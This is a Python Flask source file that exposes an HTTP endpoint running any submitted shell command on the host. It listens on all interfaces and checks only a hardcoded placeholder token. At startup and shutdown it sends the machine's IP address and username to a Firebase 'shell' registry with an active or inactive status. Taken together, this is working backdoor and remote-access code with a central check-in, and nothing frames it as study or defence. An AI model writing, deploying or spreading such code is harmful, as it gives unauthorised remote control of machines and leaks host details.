from flask import Flask, jsonify, request
import subprocess
import os
import logging
from threading import Lock
import firebase_admin
from firebase_admin import credentials, db
import socket
import getpass
import dotenv

# Load environment variables from .env file
dotenv.load_dotenv()

DB_URL = os.getenv('FIREBASE_DB_URL', 'https://your-project-id.firebaseio.com/')
API_KEY = os.getenv('FIREBASE_API_KEY', 'your_api_key_here')
AUTH_DOMAIN = os.getenv('FIREBASE_AUTH_DOMAIN', 'your_project_id.firebaseapp.com')
PROJECT_ID = os.getenv('FIREBASE_PROJECT_ID', 'your_project_id')
STORAGE_BUCKET = os.getenv('FIREBASE_STORAGE_BUCKET', 'your_project_id.appspot.com')
MESSAGING_SENDER_ID = os.getenv('FIREBASE_MESSAGING_SENDER_ID', 'your_messaging_sender_id')
APP_ID = os.getenv('FIREBASE_APP_ID', 'your_app_id')
MEASUREMENT_ID = os.getenv('FIREBASE_MEASUREMENT_ID', 'your_measurement_id')

app = Flask(__name__)
API_TOKEN = "your_secure_token_here"
current_directory = os.path.expanduser("~")  # Start in user's home directory
dir_lock = Lock()

# Initialize Firebase
def initialize_firebase():
    try:
        # Replace with your Firebase service account key path
        cred = credentials.Certificate("serviceAccountKey.json")
        firebase_admin.initialize_app(cred, {
            'databaseURL': DB_URL,
            'apiKey': API_KEY,
            'authDomain': AUTH_DOMAIN,
            'projectId': PROJECT_ID,
            'storageBucket': STORAGE_BUCKET,
            'messagingSenderId': MESSAGING_SENDER_ID,
            'appId': APP_ID,
            'measurementId': MEASUREMENT_ID
        })
        logging.info("Firebase initialized successfully")
        return True
    except Exception as e:
        logging.error(f"Firebase initialization failed: {e}")
        return False

def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        logging.error(f"Could not get IP address: {e}")
        return "unknown"

def update_firebase_status(state):
    try:
        ip = get_ip_address()
        username = getpass.getuser()
        
        ref = db.reference('shell').child(ip.replace('.', '-'))  # Replace dots for Firebase key
        ref.set({
            'username': username,
            'state': state
        })
        logging.info(f"Updated Firebase status: {state}")
    except Exception as e:
        logging.error(f"Failed to update Firebase status: {e}")

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

@app.route('/api/shell', methods=['POST'])
def handle_shell():
    global current_directory
    
    if request.headers.get('Authorization') != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    command = data.get('command', '').strip()
    
    if not command:
        return jsonify({"error": "No command provided"}), 400
    
    try:
        # Handle directory changes separately
        if command.startswith('cd '):
            new_dir = command[3:].strip()
            try:
                abs_path = os.path.abspath(os.path.join(current_directory, new_dir))
                if os.path.isdir(abs_path):
                    with dir_lock:
                        current_directory = abs_path
                    return jsonify({
                        "output": f"Changed directory to {abs_path}",
                        "current_directory": abs_path
                    })
                else:
                    return jsonify({"error": f"Directory not found: {new_dir}"}), 400
            except Exception as e:
                return jsonify({"error": str(e)}), 400
        
        # Execute other commands in a new subprocess
        result = subprocess.run(
            command,
            shell=True,
            cwd=current_directory,
            capture_output=True,
            text=True
        )
        
        output = result.stdout if result.stdout else result.stderr
        
        return jsonify({
            "output": output,
            "current_directory": current_directory
        })
        
    except Exception as e:
        logging.error(f"Command execution error: {e}")
        return jsonify({"error": str(e)}), 500

def shutdown_hook():
    update_firebase_status("inactive")

if __name__ == '__main__':
    try:
        # Register shutdown hook
        import atexit
        atexit.register(shutdown_hook)
        
        # Initialize and set status to active
        if initialize_firebase():
            update_firebase_status("active")
        
        app.run(host='0.0.0.0', port=5000, threaded=True)
    except KeyboardInterrupt:
        shutdown_hook()
    except Exception as e:
        logging.error(f"Server error: {e}")
        shutdown_hook()